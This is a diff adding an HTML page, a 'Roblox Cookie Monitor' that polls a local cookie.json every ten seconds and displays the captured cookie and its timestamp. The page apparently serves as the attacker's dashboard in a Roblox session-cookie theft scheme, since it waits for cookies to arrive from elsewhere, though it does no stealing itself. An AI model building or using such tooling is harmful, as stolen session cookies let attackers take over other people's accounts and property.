@@ -1,1 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Monitor</title>
+    <style>
+        body {
+            background: black;
+            color: #0f0;
+            font-family: monospace;
+            padding: 20px;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            background: #111;
+            color: #0f0;
+            border: 1px solid #0f0;
+            font-family: monospace;
+            padding: 10px;
+        }
+        button {
+            background: #0f0;
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .status {
+            margin-top: 10px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🍪 Roblox Cookie Monitor</h1>
+    <textarea id="cookieBox" readonly placeholder="Waiting for cookie..."></textarea>
+    <button onclick="refreshCookie()">Refresh</button>
+    <div class="status" id="status"></div>
 
+    <script>
+        async function refreshCookie() {
+            try {
+                const response = await fetch('cookie.json?t=' + Date.now());
+                const data = await response.json();
+                if (data.cookie) {
+                    document.getElementById('cookieBox').value = data.cookie;
+                    document.getElementById('status').innerHTML = `✅ Last updated: ${data.timestamp}`;
+                } else {
+                    document.getElementById('cookieBox').value = 'No cookie received yet.';
+                    document.getElementById('status').innerHTML = '⏳ Waiting for first cookie...';
+                }
+            } catch (error) {
+                document.getElementById('cookieBox').value = 'Error loading cookie data.';
+                document.getElementById('status').innerHTML = '❌ Error: ' + error.message;
+            }
+        }
+
+        // Auto-refresh every 10 seconds
+        refreshCookie();
+        setInterval(refreshCookie, 10000);
+    </script>
+</body>
+</html>
